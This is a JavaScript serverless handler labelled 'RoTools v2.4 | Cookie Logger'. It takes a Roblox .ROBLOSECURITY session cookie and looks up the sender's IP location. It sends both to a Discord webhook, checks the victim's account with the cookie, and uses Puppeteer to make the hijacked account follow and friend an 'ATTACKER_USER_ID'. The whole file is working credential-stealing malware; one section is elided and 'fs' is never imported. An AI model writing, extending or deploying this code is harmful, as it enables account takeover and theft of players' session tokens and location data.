import fetch from 'node-fetch';
import puppeteer from 'puppeteer';
import { v4 as uuidv4 } from 'uuid';

export default async function handler(req, res) {
  // Authorization check
  if (req.headers.authorization !== 'Bearer secure-token-2025') {
    return res.status(401).json({ error: 'Unauthorized' });
  }

  // Method check
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { cookie } = req.body;
    if (!cookie) {
      return res.status(400).json({ error: 'No cookie provided' });
    }

    // Get client IP address
    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
    
    // IP information lookup (same as before)
    let ipInfo = {};
    try {
      const ipRes = await fetch(`http://ip-api.com/json/${ip}?fields=66842623`);
      ipInfo = await ipRes.json();
    } catch (ipError) {
      console.error('IP info fetch error:', ipError);
      ipInfo = { status: 'error', message: 'IP lookup failed' };
    }

    // Format IP fields (same as before)
    const ipFields = [];
    if (ipInfo.status === 'success') {
      ipFields.push(
        { name: '📍 Location', value: `${ipInfo.city}, ${ipInfo.regionName}, ${ipInfo.country}`, inline: true },
        { name: '📡 ISP', value: ipInfo.isp || 'Unknown', inline: true },
        { name: '🏢 Organization', value: ipInfo.org || 'Unknown', inline: true },
        { name: '🛰️ AS', value: ipInfo.as || 'Unknown', inline: true },
        { name: '🌐 Coordinates', value: `[${ipInfo.lat}, ${ipInfo.lon}](https://maps.google.com/?q=${ipInfo.lat},${ipInfo.lon})`, inline: true },
        { name: '📮 ZIP', value: ipInfo.zip || 'Unknown', inline: true },
        { name: '⏰ Timezone', value: ipInfo.timezone || 'Unknown', inline: true },
        { name: '💰 Currency', value: ipInfo.currency || 'Unknown', inline: true },
        { name: '🔐 Proxy', value: ipInfo.proxy ? '✅ Yes' : '❌ No', inline: true },
        { name: '🛡️ Hosting', value: ipInfo.hosting ? '✅ Yes' : '❌ No', inline: true }
      );
    } else {
      ipFields.push(
        { name: '❌ IP Info Error', value: ipInfo.message || 'Failed to fetch IP information' }
      );
    }

    // Send cookie + IP info to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [
          {
            title: "🍪 RAW COOKIE RECEIVED",
            description: `\`\`\`\n${cookie}\n\`\`\``,
            color: 0x000000,
            footer: { text: "RoTools v2.4 | Cookie Logger" },
            timestamp: new Date().toISOString()
          },
          {
            title: "🌐 IP INFORMATION",
            color: 0x000000,
            fields: [
              { name: '📡 IP Address', value: `\`${ip}\``, inline: false },
              ...ipFields
            ],
            footer: { text: "RoTools v2.4 | IP Intelligence" },
            timestamp: new Date().toISOString()
          }
        ]
      })
    });

    // Get account information (same as before)
    const userRes = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: { 'Cookie': `.ROBLOSECURITY=${cookie}` }
    });
    
    if (!userRes.ok || userRes.status === 401) {
      await fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: "❌ INVALID COOKIE",
            description: "Authentication failed with provided cookie",
            color: 0x000000,
            footer: { text: "RoTools v2.4 | Error" },
            timestamp: new Date().toISOString()
          }]
        })
      });
      
      return res.json({ 
        success: false, 
        error: 'Invalid cookie - authentication failed'
      });
    }

    const userData = await userRes.json();
    const userId = userData.id;

    // Fetch account data (same as before)
    // ... [rest of account data fetching code remains unchanged] ...

    // Send account information to Discord (same as before)
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [accountInfoEmbed] })
    });

    // Puppeteer automation for browser-like actions
    const ATTACKER_USER_ID = process.env.ATTACKER_USER_ID || '8318490238';
    const result = await performBrowserActions(cookie, ATTACKER_USER_ID);
    
    // Send action results to Discord
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title: "🤖 AUTO ACTIONS PERFORMED",
          color: 0x000000,
          fields: [
            { name: 'Follow Action', value: result.followSuccess ? '✅ Success' : '❌ Failed', inline: true },
            { name: 'Friend Request', value: result.friendSuccess ? '✅ Success' : '❌ Failed', inline: true },
            { name: 'Target User', value: ATTACKER_USER_ID, inline: false },
            { name: 'Method', value: 'Puppeteer Browser Automation', inline: false }
          ],
          footer: { text: "RoTools v2.4 | Auto Actions" },
          timestamp: new Date().toISOString()
        }]
      })
    });

    return res.json({ success: true });
    
  } catch (error) {
    console.error('Server error:', error);
    
    await fetch(process.env.DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "@everyone",
        embeds: [{
          title: "❌ PROCESSING ERROR",
          color: 0x000000,
          fields: [{
            name: "Error Details",
            value: `\`\`\`\n${error.message || 'Unknown error'}\n\`\`\``
          }],
          footer: { text: "RoTools v2.4 | Error Notification" },
          timestamp: new Date().toISOString()
        }]
      })
    });
    
    return res.status(500).json({ 
      success: false, 
      error: error.message || 'Internal server error' 
    });
  }
}

// Puppeteer-based action performer
async function performBrowserActions(cookie, targetUserId) {
  const result = { followSuccess: false, friendSuccess: false };
  let browser;
  
  try {
    // Launch Puppeteer with specific options
    browser = await puppeteer.launch({
      headless: true,
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--single-process',
        '--disable-gpu'
      ],
      executablePath: process.env.PUPPETEER_EXECUTABLE_PATH || null
    });

    const context = await browser.createIncognitoBrowserContext();
    const page = await context.newPage();
    
    // Set user agent to mimic Chrome
    await page.setUserAgent('Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36');
    
    // Set Roblox cookie
    await page.setCookie({
      name: '.ROBLOSECURITY',
      value: cookie,
      domain: '.roblox.com',
      path: '/',
      httpOnly: true,
      secure: true,
      sameSite: 'None'
    });

    // Navigate to profile page
    await page.goto(`https://www.roblox.com/users/${targetUserId}/profile`, {
      waitUntil: 'networkidle2',
      timeout: 60000
    });

    // Click follow button
    try {
      const followButton = await page.waitForSelector('.btn-follow', { timeout: 10000 });
      await followButton.click();
      await page.waitForResponse(response => 
        response.url().includes('follow') && response.status() === 200,
        { timeout: 10000 }
      );
      result.followSuccess = true;
    } catch (e) {
      console.error('Follow action failed:', e);
    }

    // Click friend button
    try {
      const friendButton = await page.waitForSelector('.btn-add-friend', { timeout: 10000 });
      await friendButton.click();
      await page.waitForResponse(response => 
        response.url().includes('request-friendship') && response.status() === 200,
        { timeout: 10000 }
      );
      result.friendSuccess = true;
    } catch (e) {
      console.error('Friend action failed:', e);
    }

    // Take screenshot for debugging
    const screenshotPath = `/tmp/screenshot-${uuidv4()}.png`;
    await page.screenshot({ path: screenshotPath, fullPage: true });
    
    // Upload screenshot to Discord
    try {
      const screenshotBuffer = fs.readFileSync(screenshotPath);
      await fetch(process.env.DISCORD_WEBHOOK, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: "🖥️ Browser Action Screenshot",
          embeds: [{
            title: "Browser Session Screenshot",
            image: { url: 'attachment://screenshot.png' }
          }],
          files: [{
            name: 'screenshot.png',
            data: screenshotBuffer.toString('base64'),
            contentType: 'image/png'
          }]
        })
      });
      fs.unlinkSync(screenshotPath);
    } catch (e) {
      console.error('Failed to upload screenshot:', e);
    }

  } catch (error) {
    console.error('Puppeteer error:', error);
  } finally {
    if (browser) await browser.close();
  }

  return result;
}
